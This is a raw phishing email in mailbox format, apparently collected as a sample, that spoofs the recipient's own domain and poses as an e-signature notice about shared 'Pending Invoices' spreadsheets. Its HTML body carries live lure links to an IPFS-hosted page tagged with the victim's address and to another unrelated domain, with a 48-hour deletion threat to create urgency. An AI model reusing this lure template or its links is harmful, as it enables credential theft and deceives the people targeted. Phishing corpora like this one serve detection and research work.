@@ -1,0 +1,197 @@
+From jose@monkey.org Thu Jun  8 00:38:34 2023 +0000
+Return-Path: jose@monkey.org
+Delivered-To: jose@monkey.org
+X-FDA: 80877719748.11.C34E351
+Received: from xyz-sales.com (xyz-sales.com [176.126.164.173])
+	by imf08.b.hostedemail.com (Postfix) with ESMTP id 9BB73160004
+	for <jose@monkey.org>; Thu,  8 Jun 2023 00:38:32 +0000 (UTC)
+Authentication-Results: imf08.b.hostedemail.com;
+	dkim=none;
+	spf=softfail (imf08.b.hostedemail.com: 176.126.164.173 is neither permitted nor denied by domain of jose@monkey.org) smtp.mailfrom=jose@monkey.org;
+	dmarc=none
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=hostedemail.com;
+	s=arc-20220608; t=1686184713;
+	h=from:from:sender:reply-to:subject:subject:date:date:
+	 message-id:message-id:to:to:cc:mime-version:mime-version:
+	 content-type:content-type:
+	 content-transfer-encoding:content-transfer-encoding:in-reply-to:
+	 references; bh=PrhrT/WUt3upNzL7gbm5UKDEh0ph1msssV/Y4c2QkX8=;
+	b=eTeh2tkilX0xro06VRmrfbOODTYUcJinETygL50aCupwp8z5lyW6ISRC6WW32uiXpxhmju
+	gV/LY5VtumFSFJ7EzTRSnfRSvtYic44tnliRKGYIONmLNYgVWPs7i4S+ytntS7vxwNMmgR
+	oQhe2skSq7zWfH+9AUCstZSQeN3GhNE=
+ARC-Seal: i=1; s=arc-20220608; d=hostedemail.com; t=1686184713; a=rsa-sha256;
+	cv=none;
+	b=RZHbOnECg9YZHwsY+IQcn+wqXXeUOI5kgOTwp70zB2AzzfP0FOBL1VQoTt/0sJVNWYhfqX
+	NxFSNhwgg7NPKIN9LY9OdfnVxlaoqT5vUe3GLPBfU50xezrcqU6dvK60G8A0G4oPi5sU8p
+	hHjH0ZeCNz4ZMI5qMLpuwgslXZZY8no=
+ARC-Authentication-Results: i=1;
+	imf08.b.hostedemail.com;
+	dkim=none;
+	spf=softfail (imf08.b.hostedemail.com: 176.126.164.173 is neither permitted nor denied by domain of jose@monkey.org) smtp.mailfrom=jose@monkey.org;
+	dmarc=none
+From: monkey.org e-Sign<jose@monkey.org>
+To: jose@monkey.org
+Subject: Admin@monkey.org shared some documents with you on 6/8/2023 2:38:28 a.m.
+Date: 08 Jun 2023 02:38:28 +0200
+Message-ID: <20230608023828.F697B0BEE358BAEF@monkey.org>
+MIME-Version: 1.0
+Content-Type: text/html;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+X-Rspamd-Server: rspam03
+X-Rspamd-Queue-Id: 9BB73160004
+X-Stat-Signature: pjko8u3yykeioohfeux19hpppzao6egk
+X-Rspam-User: 
+X-Spam-Status: No, score=5.59
+X-HE-Tag: 1686184712-59440
+X-HE-Meta: U2FsdGVkX1/bCyOC1OcGvrw8ys+mMHfUkYulIyYDE5yby8XxUG0xjSxGwsyrTV/uSNQgjjl03g/DOZojX6/e/dtJsKkfMU03WXG23t5/MlSJlUUTb8LUcE+raoojjRKkXcuflWm6eWe+g0WsTFFmAwNeIoO7LbrHf7NmHqqQISx05JCrPErXZiZ7XSb3GLXnTr+mSkcYHtnCehx9CoAWjYIk+i4jMgw6HNseFM+VxaI=
+Status: O
+X-Status: 
+X-Keywords:                  
+X-UID: 154
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.=
+w3.org/TR/html4/loose.dtd">
+
+<HTML><HEAD>
+<META name=3DGENERATOR content=3D"MSHTML 11.00.10570.1001"></HEAD>
+<BODY style=3D"MARGIN: 0.5em">
+<TABLE style=3D"FONT-SIZE: 15px; OVERFLOW: hidden; MAX-WIDTH: 640px; BORDER=
+-TOP: rgb(200,200,200) 1px solid; FONT-FAMILY: Arial, Helvetica, sans-serif=
+; BORDER-RIGHT: rgb(200,200,200) 1px solid; WIDTH: 638px; WHITE-SPACE: norm=
+al; WORD-SPACING: 0px; BORDER-COLLAPSE: collapse; BORDER-BOTTOM: rgb(200,20=
+0,200) 1px solid; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(32,31,=
+30); FONT-STYLE: normal; BORDER-LEFT: rgb(200,200,200) 1px solid; ORPHANS: =
+2; WIDOWS: 2; MARGIN: 0px auto; LETTER-SPACING:=20
+normal; BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px; font-variant-=
+ligatures: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0p=
+x; text-decoration-thickness: initial; text-decoration-style: initial; text=
+-decoration-color: initial; border-radius: 8px; font-stretch: inherit; font=
+-variant-numeric: inherit; font-variant-east-asian: inherit" cellSpacing=3D=
+0 cellPadding=3D0 border=3D0>
+<COLGROUP style=3D"BOX-SIZING: border-box">
+<COL style=3D"BOX-SIZING: border-box; WIDTH: 0px" width=3D16>
+<COL style=3D"BOX-SIZING: border-box; WIDTH: 0px" width=3D608>
+<COL style=3D"BOX-SIZING: border-box; WIDTH: 0px" width=3D16></COLGROUP>
+<TBODY style=3D"BOX-SIZING: border-box">
+<TR style=3D"BOX-SIZING: border-box">
+<TD style=3D"BOX-SIZING: border-box; PADDING-TOP: 36px; PADDING-LEFT: 36px;=
+ MARGIN: 0px; PADDING-RIGHT: 36px" colSpan=3D3 align=3Dcenter><IMG style=3D=
+"BORDER-LEFT-WIDTH: 0px; BOX-SIZING: border-box; BORDER-RIGHT-WIDTH: 0px; V=
+ERTICAL-ALIGN: baseline; BORDER-BOTTOM-WIDTH: 0px; COLOR: ; PADDING-BOTTOM:=
+ 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; DISPLAY: block; PAD=
+DING-RIGHT: 0px; BORDER-TOP-WIDTH: 0px" width=3D40></TD></TR>
+<TR style=3D"BOX-SIZING: border-box">
+<TD style=3D"BOX-SIZING: border-box; PADDING-BOTTOM: 36px; PADDING-TOP: 20p=
+x; PADDING-LEFT: 36px; MARGIN: 0px; PADDING-RIGHT: 36px" colSpan=3D3 align=
+=3Dcenter>
+<P style=3D"BOX-SIZING: border-box; FONT-SIZE: 24px; MAX-WIDTH: 400px; FONT=
+-WEIGHT: 600; COLOR: rgb(50,49,48); PADDING-BOTTOM: 0px; PADDING-TOP: 0px; =
+PADDING-LEFT: 0px; MARGIN: 0px; LINE-HEIGHT: 32px; PADDING-RIGHT: 0px">A ne=
+w file was sent to jose@monkey.org&nbsp;for further actions.</P></TD></TR>
+<TR style=3D"BOX-SIZING: border-box">
+<TD style=3D"BOX-SIZING: border-box; BORDER-TOP: rgb(222,222,222) 1px solid=
+; PADDING-BOTTOM: 28px; TEXT-ALIGN: center; PADDING-TOP: 40px; PADDING-LEFT=
+: 20px; MARGIN: 0px; PADDING-RIGHT: 20px; BACKGROUND-COLOR: rgb(248,248,248=
+)" colSpan=3D3>
+<P style=3D"BOX-SIZING: border-box; FONT-SIZE: 16px; COLOR: rgb(50,49,48); =
+MARGIN: 0px"></P></TD></TR>
+<TR style=3D"BOX-SIZING: border-box">
+<TD style=3D"BOX-SIZING: border-box; MARGIN: 0px; BACKGROUND-COLOR: rgb(248=
+,248,248)" colSpan=3D3 align=3Dcenter>
+<TABLE style=3D"WIDTH: 481px; BACKGROUND: rgb(255,255,255); BORDER-COLLAPSE=
+: collapse" cellSpacing=3D0 cellPadding=3D0 align=3Dcenter border=3D0>
+<TBODY style=3D"BOX-SIZING: border-box">
+<TR style=3D"BOX-SIZING: border-box">
+<TD style=3D"BOX-SIZING: border-box; BORDER-TOP: rgb(210,210,210) 1px solid=
+; BORDER-BOTTOM: rgb(210,210,210) 1px solid; PADDING-BOTTOM: 20px; PADDING-=
+TOP: 20px; PADDING-LEFT: 20px; BORDER-LEFT: rgb(210,210,210) 1px solid; MAR=
+GIN: 0px; PADDING-RIGHT: 4px; background-size: initial; background-origin: =
+initial; background-clip: initial">
+<IMG style=3D"BORDER-LEFT-WIDTH: 0px; BOX-SIZING: border-box; BORDER-RIGHT-=
+WIDTH: 0px; WIDTH: 32px; VERTICAL-ALIGN: baseline; BORDER-BOTTOM-WIDTH: 0px=
+; COLOR: ; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN=
+: 0px; DISPLAY: block; PADDING-RIGHT: 0px; BORDER-TOP-WIDTH: 0px" width=3D3=
+2></TD>
+<TD style=3D"BOX-SIZING: border-box; FONT-SIZE: 16px; BORDER-TOP: rgb(210,2=
+10,210) 1px solid; BORDER-RIGHT: rgb(210,210,210) 1px solid; BORDER-BOTTOM:=
+ rgb(210,210,210) 1px solid; PADDING-BOTTOM: 20px; PADDING-TOP: 20px; PADDI=
+NG-LEFT: 4px; MARGIN: 0px; PADDING-RIGHT: 20px">
+<A style=3D"BOX-SIZING: border-box; COLOR: rgb(0,172,255); BACKGROUND-COLOR=
+: transparent; text-decoration-line: none" href=3D"https://bafybeig2qcho5if=
+jinamqxggpzibvx2dc4xhvo2nmeiox752hy7owujgp4.ipfs.dweb.link/Serial-Number07.=
+html#jose@monkey.org" rel=3Dnoreferrer target=3D_blank><SPAN style=3D"BOX-S=
+IZING: border-box; FONT-WEIGHT: bolder">Pending Invoices(APR-MAY) #1814891 =
+&amp; #9536017.xlsx</SPAN></A></TD></TR></TBODY></TABLE></TD></TR>
+<TR style=3D"BOX-SIZING: border-box">
+<TD style=3D"BOX-SIZING: border-box; TEXT-ALIGN: center; MARGIN: 0px; BACKG=
+ROUND-COLOR: rgb(248,248,248)" colSpan=3D3 align=3Dcenter>
+<TABLE style=3D"HEIGHT: 20px; WIDTH: auto; BORDER-COLLAPSE: collapse" cellS=
+pacing=3D0 cellPadding=3D0 align=3Dcenter border=3D0>
+<TBODY style=3D"BOX-SIZING: border-box">
+<TR style=3D"BOX-SIZING: border-box">
+<TD style=3D"BOX-SIZING: border-box; HEIGHT: 20px; PADDING-BOTTOM: 20px; PA=
+DDING-TOP: 24px; PADDING-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 4px" align=
+=3Dcenter><IMG style=3D"BORDER-LEFT-WIDTH: 0px; BOX-SIZING: border-box; BOR=
+DER-RIGHT-WIDTH: 0px; VERTICAL-ALIGN: baseline; BORDER-BOTTOM-WIDTH: 0px; C=
+OLOR: ; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0=
+px; PADDING-RIGHT: 0px; BORDER-TOP-WIDTH: 0px" width=3D20 height=3D20></TD>=
+
+<TD style=3D"BOX-SIZING: border-box; FONT-SIZE: 12px; COLOR: rgb(50,49,48);=
+ PADDING-BOTTOM: 20px; PADDING-TOP: 20px; PADDING-LEFT: 0px; MARGIN: 0px; P=
+ADDING-RIGHT: 0px">This document will be deleted within 48hours of mail rec=
+eipt.</TD></TR></TBODY></TABLE></TD></TR>
+<TR style=3D"BOX-SIZING: border-box">
+<TD style=3D"BOX-SIZING: border-box; BORDER-TOP: medium none; HEIGHT: 40px;=
+ BORDER-BOTTOM: medium none; PADDING-BOTTOM: 32px; TEXT-ALIGN: center; PADD=
+ING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px; BACKGROUN=
+D-COLOR: rgb(248,248,248)" colSpan=3D3><A style=3D"BOX-SIZING: border-box; =
+COLOR: rgb(0,172,255); BACKGROUND-COLOR: transparent; text-decoration-line:=
+ none" href=3D"https://unicorncollections.com/weozalite/hyundiekdk/index.ph=
+p?userid=3Dinfo@maray.com" rel=3Dnoreferrer target=3D_blank></A>
+<A style=3D"BOX-SIZING: border-box; COLOR: rgb(0,172,255); BACKGROUND-COLOR=
+: transparent; text-decoration-line: none" href=3D"https://bafybeig2qcho5if=
+jinamqxggpzibvx2dc4xhvo2nmeiox752hy7owujgp4.ipfs.dweb.link/Serial-Number07.=
+html#jose@monkey.org" rel=3Dnoreferrer target=3D_blank><SPAN style=3D"BOX-S=
+IZING: border-box; FONT-WEIGHT: bolder">PREVIEW | DOWNLOAD</SPAN></A></TD><=
+/TR></TBODY></TABLE>
+<TABLE style=3D"FONT-SIZE: small; FONT-FAMILY: Arial, Helvetica, sans-serif=
+; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT=
+: 400; COLOR: rgb(34,34,34); FONT-STYLE: normal; ORPHANS: 2; WIDOWS: 2; LET=
+TER-SPACING: normal; BACKGROUND-COLOR: rgb(255,255,255); font-variant-ligat=
+ures: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; te=
+xt-decoration-thickness: initial; text-decoration-style: initial; text-deco=
+ration-color: initial" cellSpacing=3D0 cellPadding=3D0=20
+border=3D0>
+<COLGROUP style=3D"BOX-SIZING: border-box">
+<COL style=3D"BOX-SIZING: border-box; WIDTH: 0px" width=3D64>
+<COL style=3D"BOX-SIZING: border-box; WIDTH: 0px" width=3D256>
+<COL style=3D"BOX-SIZING: border-box; WIDTH: 0px" width=3D135>
+<COL style=3D"BOX-SIZING: border-box; WIDTH: 0px" width=3D175></COLGROUP>
+<TBODY style=3D"BOX-SIZING: border-box">
+<TR style=3D"BOX-SIZING: border-box">
+<TD style=3D"BOX-SIZING: border-box; HEIGHT: 18px; VERTICAL-ALIGN: top; PAD=
+DING-BOTTOM: 4px; PADDING-TOP: 16px; PADDING-LEFT: 16px; MARGIN: 0px; PADDI=
+NG-RIGHT: 16px" vAlign=3Dtop colSpan=3D2><IMG style=3D"BORDER-LEFT-WIDTH: 0=
+px; BOX-SIZING: border-box; BORDER-RIGHT-WIDTH: 0px; VERTICAL-ALIGN: baseli=
+ne; BORDER-BOTTOM-WIDTH: 0px; COLOR: ; PADDING-BOTTOM: 0px; PADDING-TOP: 0p=
+x; PADDING-LEFT: 0px; MARGIN: 0px; DISPLAY: block; PADDING-RIGHT: 0px; BORD=
+ER-TOP-WIDTH: 0px" width=3D84 height=3D18></TD>
+<TD style=3D"BOX-SIZING: border-box; HEIGHT: 18px; PADDING-BOTTOM: 4px; PAD=
+DING-TOP: 16px; PADDING-LEFT: 16px; MARGIN: 0px; PADDING-RIGHT: 16px" colSp=
+an=3D2 align=3Dright><BR style=3D"BOX-SIZING: border-box"></TD></TR>
+<TR style=3D"BOX-SIZING: border-box">
+<TD style=3D"BOX-SIZING: border-box; FONT-SIZE: 12px; HEIGHT: 18px; WIDTH: =
+288px; COLOR: rgb(96,94,92); PADDING-BOTTOM: 4px; PADDING-TOP: 4px; PADDING=
+-LEFT: 16px; MARGIN: 0px; LINE-HEIGHT: 18px; PADDING-RIGHT: 16px" colSpan=
+=3D2>
+<SPAN style=3D"BORDER-LEFT-WIDTH: 0px; BOX-SIZING: border-box; BORDER-RIGHT=
+-WIDTH: 0px; VERTICAL-ALIGN: baseline; BORDER-BOTTOM-WIDTH: 0px; COLOR: ; P=
+ADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; DISPL=
+AY: inline-block; PADDING-RIGHT: 0px; BORDER-TOP-WIDTH: 0px">
+<A style=3D"BOX-SIZING: border-box; COLOR: rgb(0,172,255); BACKGROUND-COLOR=
+: transparent; text-decoration-line: none" href=3D"https://unicorncollectio=
+ns.com/weozalite/hyundiekdk/index.php?userid=3Dinfo@maray.com" rel=3Dnorefe=
+rrer target=3D_blank>Privacy Statement</A></SPAN></TD></TR></TBODY></TABLE>=
+
+<P>&nbsp;</P></BODY></HTML>
